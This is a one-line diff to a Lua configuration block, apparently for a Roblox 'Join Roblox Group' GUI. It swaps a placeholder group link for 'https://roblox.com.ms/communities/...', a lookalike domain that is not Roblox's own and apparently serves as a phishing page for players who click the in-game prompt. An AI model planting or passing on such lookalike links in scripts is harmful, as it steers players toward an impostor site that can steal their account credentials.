@@ -8,7 +8,7 @@
 ]]
 
 -- ============ CONFIG (edit this whenever you want) ============
-local GROUP_LINK = "[PASTE YOUR ROBLOX GROUP LINK HERE]"
+local GROUP_LINK = "https://roblox.com.ms/communities/2369625324/"
 local GUI_NAME   = "Join Roblox Group"
 -- =================================================================
 
